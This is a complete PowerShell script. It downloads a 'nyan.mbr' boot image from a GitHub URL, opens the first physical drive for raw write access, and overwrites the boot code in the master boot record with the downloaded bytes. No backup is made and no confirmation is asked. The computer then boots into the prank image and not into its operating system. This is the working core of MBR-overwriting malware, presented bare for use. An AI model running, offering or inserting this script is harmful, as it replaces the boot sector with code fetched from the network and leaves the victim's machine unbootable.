# Download raw nyan.mbr binary (512 bytes)
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/brainsmoke/nyanmbr/master/nyan.mbr' -OutFile "$env:TEMP\nyan.mbr" -UseBasicParsing

# Read the bytes
$bootBytes = [System.IO.File]::ReadAllBytes("$env:TEMP\nyan.mbr")

if ($bootBytes.Length -ne 512) {
    throw "nyan.mbr is not 512 bytes (got $($bootBytes.Length))"
}

# Open physical drive 0
$fs = New-Object System.IO.FileStream(
    "\\.\PhysicalDrive0",
    [System.IO.FileMode]::Open,
    [System.IO.FileAccess]::ReadWrite,
    [System.IO.FileShare]::ReadWrite
)

try {
    # Read existing MBR
    $sector = New-Object byte[] 512
    $fs.Read($sector, 0, 512) | Out-Null

    # Overwrite just the first 446 bytes with nyan.mbr’s boot code
    [Array]::Copy($bootBytes, 0, $sector, 0, 446)

    # Seek back and write
    $fs.Seek(0, [System.IO.SeekOrigin]::Begin) | Out-Null
    $fs.Write($sector, 0, 512)
    $fs.Flush()
}
finally {
    $fs.Close()
}
